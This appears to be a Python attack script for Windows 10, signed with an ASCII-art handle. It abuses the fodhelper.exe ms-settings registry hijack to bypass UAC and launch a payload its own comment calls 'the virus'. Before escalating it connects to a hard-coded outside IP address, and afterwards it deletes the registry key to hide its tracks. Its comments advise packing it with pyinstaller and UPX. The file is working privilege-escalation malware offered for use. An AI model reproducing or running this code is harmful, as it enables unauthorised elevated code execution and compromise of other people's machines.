 # coding: utf-8
'''
	Designed By : 
 █     █░ ██▓ ██▓    ▓█████▄  ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▓█░ █ ░█░▓██▒▓██▒    ▒██▀ ██▌▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒█░ █ ░█ ▒██▒▒██░    ░██   █▌▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
░█░ █ ░█ ░██░▒██░    ░▓█▄   ▌▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░░██▒██▓ ░██░░██████▒░▒████▓ ░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██
	cRi3d on windows 10 using trusted binaries
'''

# turn this file into exe using pyinstaller then use upx packer to compress or expand executable file

import os
import socket
import sys
import ctypes
import _winreg

CMD                   = r"python F:\H4ck3er\UT\OnionServer\KrY.py" # the virus; it can be exe!
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
HOST                  = '52.14.61.47'
PORT                  =  NGROK_OPENED_PORT


def create_reg_key(key, value):
	try:        
		_winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
		registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)                
		_winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)        
		_winreg.CloseKey(registry_key)
	except WindowsError:        
		raise

def bypass_uac(cmd):
	try:
		create_reg_key(DELEGATE_EXEC_REG_KEY, '')
		create_reg_key(None, cmd)    
	except WindowsError:
		raise

def setup():
	current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
	cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
	return cmd

def cRy():        
	try:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((HOST, PORT))
			s.close()
		except:
			cRy()
		bypass_uac(setup())                
		os.system(FOD_HELPER)
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
		sys.exit(0)
	except WindowsError:
		# sys.exit(1)
		cRy()    



if __name__ == '__main__':
	cRy()